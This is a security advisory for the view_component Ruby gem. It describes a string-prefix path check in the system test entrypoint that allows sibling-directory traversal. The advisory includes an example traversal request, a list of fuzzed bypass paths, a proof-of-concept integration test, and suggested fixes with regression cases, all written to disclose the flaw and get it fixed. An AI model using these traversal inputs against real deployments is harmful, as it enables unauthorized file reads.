# [M] view_component: System Test Entry Point Path Check Allows Sibling Directory Escape

## Summary
Severity: Medium
Advisory: GHSA-hg3h-g7xc-f7vp
CVE: CVE-2026-44837
CWE: CWE-187, CWE-22
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-hg3h-g7xc-f7vp
Type: github-advisory

## Affected
- RubyGems: `view_component` — affected >=3.0.0 <4.9.0

## Details
### Summary

The system test entrypoint canonicalizes a user-controlled file path with `File.realpath`, then checks whether the resolved path starts with the temp directory path. This is not a safe containment check because sibling directories can share the same string prefix.

Severity: Medium; test-route scoped.

Example:

```text
Allowed base:  /app/tmp/view_components
Outside path:  /app/tmp/view_components_evil/secret.html.erb
```

The outside path is not inside the base directory, but it passes:

```ruby
@path.start_with?(base_path)
```

### Relevant Code

`app/controllers/view_components_system_test_controller.rb`:

```ruby
base_path = ::File.realpath(self.class.temp_dir)
@path = ::File.realpath(params.permit(:file)[:file], base_path)
raise ViewComponent::SystemTestControllerNefariousPathError unless @path.start_with?(base_path)
```

The route then renders the resolved file:

```ruby
render file: @path
```

### Exploit Flow

Example request:

```text
GET /_system_test_entrypoint?file=../view_components_evil/secret.html.erb
```

Flow:

1. `base_path` resolves to `.../tmp/view_components`.
2. The payload resolves to `.../tmp/view_components_evil/secret.html.erb`.
3. That path is outside the intended temp directory.
4. The string prefix check still passes.
5. Rails renders the sibling file.

The route is mounted only in `Rails.env.test?`, which is why Medium is more appropriate than P1. The issue matters if test routes are reachable in shared CI, staging, review apps, or any accidentally exposed test-mode deployment.

### Targeted Fuzz Result

The following sibling paths passed an equivalent `realpath` plus `start_with?` harness while resolving outside the base directory:

```text
../view_components_evil/secret.html
../view_components2/poc.html
../view_components.bak/poc.html
../view_components-old/poc.html
../view_componentsx/poc.html
```

### PoC Test

Create `test/sandbox/test/system_test_entrypoint_path_traversal_poc_test.rb`:

```ruby
# frozen_string_literal: true

require "test_helper"
require "fileutils"

class SystemTestEntrypointPathTraversalPocTest < ActionDispatch::IntegrationTest
  def test_system_test_entrypoint_allows_sibling_directory_with_same_prefix
    base_dir = File.realpath(ViewComponentsSystemTestController.temp_dir)
    parent_dir = File.dirname(base_dir)
    sibling_dir = File.join(parent_dir, "#{File.basename(base_dir)}_evil")
    outside_file = File.join(sibling_dir, "secret.html.erb")

    FileUtils.mkdir_p(sibling_dir)
    File.write(outside_file, "<div>VC_SYSTEM_TEST_TRAVERSAL_POC</div>")

    get "/_system_test_entrypoint", params: {
      file: "../#{File.basename(base_dir)}_evil/secret.html.erb"
    }

    assert_response :success
    assert_includes response.body, "VC_SYSTEM_TEST_TRAVERSAL_POC"
  ensure
    FileUtils.rm_f(outside_file) if defined?(outside_file) && outside_file
    Dir.rmdir(sibling_dir) if defined?(sibling_dir) && sibling_dir && Dir.exist?(sibling_dir)
  end
end
```

Run:

```bash
bundle exec ruby -Itest test/sandbox/test/system_test_entrypoint_path_traversal_poc_test.rb
```

Vulnerable behavior: the response succeeds and contains `VC_SYSTEM_TEST_TRAVERSAL_POC`.

Fixed behavior: the request raises `ViewComponent::SystemTestControllerNefariousPathError` or otherwise fails without rendering the file.

### Suggested Fix

Use path-aware containment instead of a raw string prefix. For example:

```ruby
def validate_file_path
  base_path = Pathname.new(::File.realpath(self.class.temp_dir))
  path = Pathname.new(::File.realpath(params.permit(:file)[:file], base_path.to_s))
  relative_path = path.relative_path_from(base_path)

  raise ViewComponent::SystemTestControllerNefariousPathError if relative_path.each_filename.first == ".."

  @path = path.to_s
end
```

Or require a separator boundary:

```ruby
allowed_prefix = "#{base_path}#{File::SEPARATOR}"
unless @path == base_path || @path.start_with?(allowed_prefix)
  raise ViewComponent::SystemTestControllerNefariousPathError
end
```

Add regression tests for:

- A normal temp file inside `tmp/view_components`
- `../../README.md`
- `../view_components_evil/secret.html.erb`
- A symlink inside the temp directory that resolves outside it

## References
- https://github.com/ViewComponent/view_component/security/advisories/GHSA-hg3h-g7xc-f7vp
- https://nvd.nist.gov/vuln/detail/CVE-2026-44837
- https://github.com/ViewComponent/view_component
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/view_component/CVE-2026-44837.yml
